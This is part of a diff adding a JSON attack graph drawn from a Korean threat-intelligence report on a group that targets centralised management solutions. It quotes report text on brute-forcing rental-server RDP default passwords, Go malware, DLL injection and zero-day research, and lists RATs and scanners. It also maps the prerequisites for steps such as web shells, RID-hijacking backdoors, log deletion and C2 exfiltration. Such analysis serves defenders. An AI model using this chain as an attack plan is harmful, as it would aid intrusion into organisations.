+      "fact_id": "F29",
+      "name": "attacker.rental_server.ip_range",
+      "description": "무작위 대입 대상 임대 서버 IP 대역",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 4,
+          "text": "공격자는 이번 공격을 수행하기 위해 특정 국내 서버를 임대하였다. 이 임대 업체는 고객에게 서버\n를 제공할 때 특정한 패턴을 따르는 기본 RDPRemote Desktop Protocol) 접속 비밀번호를 설정\n한다. 이러한 패턴을 알고 있던 공격자는 이를 이용하여 임대받은 서버의 IP 대역을 대상으로 무작\n위 대입 공격을 실행하였다.\n임대서버의 기본 계정정보를 이용한 무작위 대입공격\n공격자의 메일에서 발견된 임대서버의 기본 패스워드\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 4"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N16"
+      ]
+    },
+    "F30": {
+      "fact_id": "F30",
+      "name": "attacker.rdp.default_password_pattern",
+      "description": "임대업체가 설정하는 기본 RDP 비밀번호 패턴",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 4,
+          "text": "공격자는 이번 공격을 수행하기 위해 특정 국내 서버를 임대하였다. 이 임대 업체는 고객에게 서버\n를 제공할 때 특정한 패턴을 따르는 기본 RDPRemote Desktop Protocol) 접속 비밀번호를 설정\n한다. 이러한 패턴을 알고 있던 공격자는 이를 이용하여 임대받은 서버의 IP 대역을 대상으로 무작\n위 대입 공격을 실행하였다.\n임대서버의 기본 계정정보를 이용한 무작위 대입공격\n공격자의 메일에서 발견된 임대서버의 기본 패스워드\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 4"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N16"
+      ]
+    },
+    "F31": {
+      "fact_id": "F31",
+      "name": "attacker.dev.reference",
+      "description": "악성코드 개발 참조 자료(GitHub go-memexec 등)",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 8,
+          "text": "에 기존에 사용하지 않았던 신종 악성코드를 개발, 활용하는 모습을 보였다. 특히 이전과 달리, 기존\n부터 활용하던 악성코드 대비 신종 악성코드를 사용하는 비율이 월등히 높은 모습을 보인다.\n공격자는 C/C, .NET 악성코드에 더하여 Golang으로 작성한 악성코드를 적극적으로 개발, 사\n용하고 있으며 그 비율은 더 높아지고 있다. 이는 Golang의 개발 편의성과 더불어 동일코드로 멀티\n플랫폼 환경에서의 동작을 지원한다는 특수성으로 보인다. 따라서, 향후 리눅스나 맥 환경에서 동작\n하는 Golang 악성코드를 해당 공격그룹이 사용할 것이며, 공격타겟 또한 넓어질 것을 내포한다.\nRDPRemote Desktop Protocol) 캐시의 일부에서는 main.go라는 파일명의 코드를 개발 중인\n모습을 확인하였다. 이는 공격자가 직접 코드를 개발하고 있음을 나타낸다.\nmain.go 코드 개발 정황\n공격자들은 이러한 도구 개발을 위해 여러 자료를 참조하였다. 특히, Go 언어로 된 악성 코드를 개\n발하기 위해 공개된 GitHub 저장소를 참조하였으며, 제작한 악성 코드가 탐지되지 않도록 하기 위\n해 메모리에서 실행되는 기법에 대해 검색하였다.\nGitHub의 go-memexec 접속 기록\n마찬가지로 공격자들은 효과적인 공격 수행을 위해 Dll Injection 기법에 대한 테스트를 진행하였\n다. 이 기법은 악성 코드를 대상 프로세스의 메모리 공간에 삽입하여 실행하는 방법으로, 공격자가\n시스템을 더욱 깊숙히 조종할 수 있게 해준다.\nDLL Injection 테스트 파일\nDevelop Capabilities: Exploits\n해당 공격 그룹은 국내 소프트웨어의 제로데이 취약점에 대해 많은 연구를 진행하였다. 취약점 테스\n트의 대상이 된 소프트웨어는 주로 자산 관리 솔루션, 문서 관리 솔루션, 패치 관리 솔루션 등의 중\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 8"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N22"
+      ]
+    },
+    "F32": {
+      "fact_id": "F32",
+      "name": "target.solution.source_code",
+      "description": "피해 기업서 확보한 중앙관리 솔루션 소스코드",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 9,
+          "text": "앙 집중형 관리 솔루션들이었다. 이런 솔루션들은 대부분 웹 기반의 UI를 가지고 있어, 침해한 서버\n로부터 소스 코드를 쉽게 확보할 수 있다. 따라서 공격자는 침투에 성공한 피해 기업으로부터 솔루\n션의 코드를 확보한 후, 임대 서버에 설치하여 취약점 테스트 및 개발을 진행할 수 있었다.\n중앙 집중형 관리 솔루션은 내부 시스템들에 파일 배포 및 실행이 가능하여 악성코드의 내부 전파를\n쉽게 할 수 있다. 따라서, 이러한 솔루션들이 더욱 주요한 공격 대상이었을 것이다.\n중앙 집중형 관리 솔루션의 취약점 개발 과정\nObtain Capabilities: Malware\n공격을 수행하기 위해 필요한 도구들이 각 임대서버에서 발견되었다. 이러한 도구들의 사용 목적은\n다양하며, 원격제어부터 웹페이지 구축, 웹 침투 테스트, 네트워크 트래픽 모니터링, 코드 개발, 가\n상머신 운영 등의 기능을 수행하였다. 이렇게 공격자의 임대 서버에서 발견된 다양한 도구들은 공격\n자의 공격 방법론과 전략을 이해하는 데 중요한 단서를 제공한다.\n로그에서 확인된 사용\n도구 기능\n목적\n무작위 대입 공격에 사\nWebPageLogin_BruteForce 무작위 대입 공격\n용\n무작위 대입 공격에 사\nTITAN_PRIVAT 무작위 대입 공격\n용\n무작위 대입 공격에 사\nMassscan 무작위 대입 공격\n용\n피해 시스템 제어에 사\nAmmyRAT 원격제어\n용\nVenomRat 원격제어 피해시스템 제어에 사용\nWarzoneRat 원격제어 피해시스템 제어에 사용\n图形化渗透测试武器库 모의해킹 도구 -\n(Graphica Penetration Testing\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 9"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N23"
+      ]
+    }
+  },
+  "combines": [
+    {
+      "combine_id": "C01",
+      "operator": "AND",
+      "label": "공개 취약점 기반 외부 노출 솔루션 초기 침투에 필요한 입력",
+      "consumer": "N01",
+      "members": [
+        "F01",
+        "F02",
+        "F03"
+      ]
+    },
+    {
+      "combine_id": "C02",
+      "operator": "AND",
+      "label": "PowerShell 악성코드 다운로드 실행에 필요한 입력",
+      "consumer": "N02",
+      "members": [
+        "F04",
+        "F05",
+        "F11"
+      ]
+    },
+    {
+      "combine_id": "C03",
+      "operator": "AND",
+      "label": "Windows 명령셸 악성코드 다운로드·정보수집에 필요한 입력",
+      "consumer": "N03",
+      "members": [
+        "F04",
+        "F05",
+        "F11"
+      ]
+    },
+    {
+      "combine_id": "C04",
+      "operator": "AND",
+      "label": "OS 명령 실행 가능 웹셸 생성에 필요한 입력",
+      "consumer": "N04",
+      "members": [
+        "F06",
+        "F11"
+      ]
+    },
+    {
+      "combine_id": "C05",
+      "operator": "AND",
+      "label": "솔루션 DB의 공격용 계정 생성 로그 삭제에 필요한 입력",
+      "consumer": "N07",
+      "members": [
+        "F08",
+        "F16"
+      ]
+    },
+    {
+      "combine_id": "C06",
+      "operator": "AND",
+      "label": "RID Hijacking 백도어 계정 권한 부여에 필요한 입력",
+      "consumer": "N09",
+      "members": [
+        "F07",
+        "F11"
+      ]
+    },
+    {
+      "combine_id": "C07",
+      "operator": "AND",
+      "label": "RAT 명령 전파(파이프) 수행에 필요한 입력",
+      "consumer": "N10",
+      "members": [
+        "F10",
+        "F12"
+      ]
+    },
+    {
+      "combine_id": "C08",
+      "operator": "AND",
+      "label": "솔루션 배포 기능을 통한 내부 악성코드 전파에 필요한 입력",
+      "consumer": "N11",
+      "members": [
+        "F02",
+        "F03",
+        "F05"
+      ]
+    },
+    {
+      "combine_id": "C09",
+      "operator": "AND",
+      "label": "내부 프록시를 통한 다수 단말 명령 제어에 필요한 입력",
+      "consumer": "N14",
+      "members": [
+        "F09",
+        "F10",
+        "F12"
+      ]
+    },
+    {
+      "combine_id": "C10",
+      "operator": "OR",
+      "label": "C2로 유출할 수집 데이터(파일 목록 또는 화면 캡처)",
+      "consumer": "C11",
+      "members": [
+        "F18",
+        "F19"
+      ]
+    },
+    {
+      "combine_id": "C11",
+      "operator": "AND",
+      "label": "C2 채널 정보 유출에 필요한 입력",
+      "consumer": "N15",
+      "members": [
+        "F10",
+        "F12",
+        "C10"
+      ]
+    },
+    {
+      "combine_id": "C12",
+      "operator": "AND",
+      "label": "임대 서버 무작위 대입 공격에 필요한 입력",
+      "consumer": "N16",
+      "members": [
+        "F29",
+        "F30"
+      ]
+    },
+    {
+      "combine_id": "C13",
+      "operator": "AND",
+      "label": "암호화 드라이브에 보관할 공격 자원(익스플로잇·악성코드·도구)",
+      "consumer": "N27",
+      "members": [
+        "F03",
+        "F05",
+        "F07"
+      ]
+    },
+    {
+      "combine_id": "C14",
+      "operator": "AND",
+      "label": "임대서버 웹경로 자료 적재에 필요한 입력",
+      "consumer": "N28",
+      "members": [
+        "F20",
+        "F21"
+      ]
+    }
+  ]
+}
